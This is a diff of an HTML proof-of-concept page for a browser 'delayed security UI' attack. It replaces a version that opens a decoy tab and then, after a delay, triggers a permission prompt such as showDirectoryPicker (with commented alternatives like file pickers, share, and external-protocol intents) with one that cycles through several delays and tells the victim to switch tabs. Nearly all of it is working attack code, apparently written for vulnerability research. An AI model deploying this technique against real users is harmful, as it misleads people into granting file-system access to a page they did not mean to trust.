@@ -2,99 +2,56 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Universal Delayed Security UI PoC</title>
+<title>Adaptive Delayed showDirectoryPicker</title>
 <style>
   body {
-    font-family: system-ui, Arial, sans-serif;
-    padding: 40px;
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: system-ui, sans-serif;
     background: #fafafa;
-  }
-  button {
-    padding: 14px 22px;
-    font-size: 16px;
     cursor: pointer;
+    user-select: none;
   }
-  pre {
-    margin-top: 16px;
-    padding: 12px;
-    background: #f1f1f1;
-    border-radius: 6px;
-    font-size: 13px;
-    white-space: pre-wrap;
+  h1 {
+    max-width: 420px;
+    text-align: center;
+    color: #333;
+    padding: 20px;
   }
+  small { color: #666; }
 </style>
 </head>
 <body>
 
-<h2>Universal Delayed Security UI PoC</h2>
-<p>
-1 klik → delay → context berubah → security UI muncul
-</p>
-
-<button id="run">Run PoC</button>
-<pre id="log"></pre>
+<h1>
+Click once.<br>
+Switch tab before folder picker appears.<br>
+<small>(adaptive delay)</small>
+</h1>
 
 <script>
-/* ==========================
-   CONFIGURATION
-========================== */
+const DELAYS = [1500, 2500, 3500, 5000];
+let fired = false;
 
-// Ganti TARGET_URL sesuai kebutuhan
-const TARGET_URL = "https://www.google.com";
+document.addEventListener('click', () => {
 
-// Delay (ms) — tweak per device/network
-const DELAY_MS = 3500;
+  DELAYS.forEach(delay => {
+    setTimeout(async () => {
+      if (fired) return;
+      fired = true;
 
-// Pilih SATU security-sensitive API di bawah
-async function triggerSecurityUI() {
+      try {
+        if ('showDirectoryPicker' in window) {
+          await window.showDirectoryPicker();
+        }
+      } catch (e) {}
+    }, delay);
+  });
 
-  // === File System Access API ===
-  // await window.showSaveFilePicker({ suggestedName: "test.txt" });
-
-  // await window.showOpenFilePicker();
-
-   await window.showDirectoryPicker();
-
-  // === Web Share API ===
-   // await navigator.share({ title: "Test", text: "Hello", url: "https://google.com" });
-
-  // === External Protocol / Intent ===
-  // location.href = "tel:123456789";
-  // location.href = "mailto:test@example.com";
-  // location.href = "geo:0,0?q=Jakarta";
-
-  // === Android Intent (Android Chrome only) ===
-  // location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
-
-  // === Placeholder ===
-  alert("Replace triggerSecurityUI() with a real security-sensitive API");
-}
-
-/* ==========================
-   CORE LOGIC
-========================== */
-
-const logEl = document.getElementById("log");
-const log = (m) => logEl.textContent += m + "\n";
-
-document.getElementById("run").onclick = async () => {
-  log("[+] User gesture received");
-
-  // 1) Change visible context (tab switch / navigation)
-  window.open(TARGET_URL, "_blank");
-  log("[+] Opened target tab: " + TARGET_URL);
-
-  // 2) Async gap (attack window)
-  setTimeout(async () => {
-    log("[!] Triggering security-sensitive UI after delay");
-    try {
-      await triggerSecurityUI();
-      log("[+] UI triggered");
-    } catch (e) {
-      log("[-] UI canceled / blocked: " + e);
-    }
-  }, DELAY_MS);
-};
+}, { once: true });
 </script>
 
 </body>
